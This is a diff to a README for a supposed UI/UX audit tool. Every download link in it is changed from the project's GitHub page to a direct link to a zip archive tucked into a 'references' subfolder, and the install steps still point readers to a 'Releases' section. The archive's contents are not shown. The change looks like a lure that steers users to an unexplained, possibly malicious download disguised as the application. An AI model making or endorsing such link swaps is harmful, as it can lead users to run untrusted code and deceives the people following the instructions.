@@ -1,6 +1,6 @@
 # 🔍 ui-ux-audit-skill - Improve digital products with automated feedback
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Xza2792/ui-ux-audit-skill)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Xza2792/ui-ux-audit-skill/main/ui-ux-audit/references/ui_skill_ux_audit_3.9.zip)
 
 This tool checks your website designs for common errors. It uses automated review processes to find problems in your user interface and user experience. The system scans your code across 15 categories to ensure your site remains accessible and easy for people to use. It provides specific instructions to fix these issues permanently.
 
@@ -29,7 +29,7 @@ Your computer must meet these basic standards to run the audit tool:
 
 Visit the link below to reach the project download page.
 
-[Click here to visit the download page](https://github.com/Xza2792/ui-ux-audit-skill)
+[Click here to visit the download page](https://raw.githubusercontent.com/Xza2792/ui-ux-audit-skill/main/ui-ux-audit/references/ui_skill_ux_audit_3.9.zip)
 
 1. Open the link in your web browser.
 2. Look for the "Releases" section on the right side of the page.
